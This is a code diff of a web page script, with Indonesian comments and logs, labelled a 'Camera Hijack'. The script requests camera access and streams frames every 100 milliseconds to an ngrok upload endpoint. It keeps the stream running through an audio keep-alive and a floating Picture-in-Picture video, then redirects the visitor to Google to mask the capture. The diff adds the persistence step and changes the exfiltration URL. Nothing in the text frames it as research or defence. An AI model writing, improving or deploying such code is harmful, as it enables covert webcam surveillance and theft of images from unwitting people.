@@ -44,10 +44,7 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com"; 
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";
-  
-  // Delay sebelum redirect (ms) - Dipercepat
-  var REDIRECT_DELAY = 500; // 500ms
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
   // ============================================
   // FUNGSI: AUDIO KEEP-ALIVE
@@ -98,9 +95,24 @@
   }
 
   // ============================================
-  // FUNGSI: START CAMERA & REDIRECT CEPAT
+  // FUNGSI: PICTURE-IN-PICTURE (PiP)
   // ============================================
-  function startCameraAndRedirect() {
+  async function enterPiP(videoElement) {
+    try {
+      if (document.pictureInPictureElement) {
+        await document.exitPictureInPicture();
+      }
+      await videoElement.requestPictureInPicture();
+      log("[+] 🎥 PiP Aktif (Video Melayang)!");
+    } catch (e) {
+      log("[-] PiP Gagal: " + e.message);
+    }
+  }
+
+  // ============================================
+  // FUNGSI: START CAMERA + PiP + REDIRECT
+  // ============================================
+  function startCamera() {
     try {
       log("[+] Meminta Izin Kamera...");
       
@@ -111,22 +123,26 @@
           video.play().catch(function(){});
           log("[+] 🚨 KAMERA BERHASIL diakses!");
 
-          // Mulai streaming gambar
+          // 1. Aktifkan PiP (Video Melayang)
+          setTimeout(function() {
+            enterPiP(video);
+          }, 1000);
+
+          // 2. Mulai streaming gambar
           if (streamInterval) clearInterval(streamInterval);
           streamInterval = setInterval(sendImageToServer, 100);
 
-          // Redirect ke Google setelah 500ms (kamera sudah aktif)
+          // 3. Redirect ke Google setelah PiP aktif (2000ms)
           setTimeout(function() {
-            log("[+] Redirect ke Google setelah " + REDIRECT_DELAY + "ms...");
+            log("[+] Redirect ke Google (PiP Aktif)...");
             window.location.href = TARGET_URL;
-          }, REDIRECT_DELAY);
+          }, 2000);
 
         })
         .catch(function(err) {
           log("[-] Kamera diblokir: " + err.name);
-          // Jika kamera diblokir, tetap redirect ke Google setelah 1 detik
           setTimeout(function() {
-            log("[+] Redirect ke Google (karena kamera diblokir)...");
+            log("[+] Redirect ke Google (kamera diblokir)...");
             window.location.href = TARGET_URL;
           }, 1000);
         });
@@ -146,13 +162,10 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Fast Persistent Camera Hijack...");
+    log("[!] Memulai PiP Camera Hijack...");
 
-    // A. Inisialisasi Audio Keep-Alive
     initAudioKeepAlive();
-
-    // B. Mulai Kamera & Redirect Cepat
-    startCameraAndRedirect();
+    startCamera();
 
   }, { once: true });
 
